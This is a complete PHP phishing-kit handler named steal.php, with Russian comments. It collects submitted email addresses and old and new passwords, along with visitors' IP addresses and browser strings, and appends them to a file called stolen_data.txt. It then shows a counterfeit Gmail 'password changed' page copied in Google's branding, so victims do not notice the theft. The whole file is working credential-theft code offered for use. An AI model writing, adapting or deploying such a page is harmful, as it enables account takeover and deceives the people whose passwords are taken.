<?php
// steal.php - получает и сохраняет данные

// Получаем данные из POST запроса
$email = $_POST['email'] ?? '';
$old_password = $_POST['old_password'] ?? '';
$new_password = $_POST['new_password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

// Форматируем данные для красивого вывода
$data = "═══════════════════════════════════════════\n";
$data .= "📅 ВРЕМЯ: $time\n";
$data .= "📡 IP: $ip\n";
$data .= "🌐 БРАУЗЕР: $user_agent\n";
$data .= "📧 EMAIL: $email\n";
$data .= "🔑 СТАРЫЙ ПАРОЛЬ: $old_password\n";
$data .= "🆕 НОВЫЙ ПАРОЛЬ: $new_password\n";
$data .= "═══════════════════════════════════════════\n\n";

// Сохраняем в файл
file_put_contents('stolen_data.txt', $data, FILE_APPEND);

// Создаем HTML страницу с подтверждением
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Gmail - Подтверждение</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px; text-align: center; }
        .logo { margin-bottom: 24px; }
        .logo img { width: 75px; }
        .success { background: #e6f4ea; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
        .success h2 { color: #137333; font-size: 20px; margin-bottom: 8px; }
        .success p { color: #5f6368; font-size: 14px; }
        .next-btn { background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 10px 24px; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; }
        .next-btn:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail">
        </div>
        
        <div class="success">
            <h2>✅ Пароль успешно изменен</h2>
            <p>Ваш пароль был обновлен. Теперь вы можете войти в аккаунт.</p>
        </div>
        
        <a href="https://gmail.com" class="next-btn">Перейти в Gmail</a>
    </div>
</body>
</html>
<?php
?>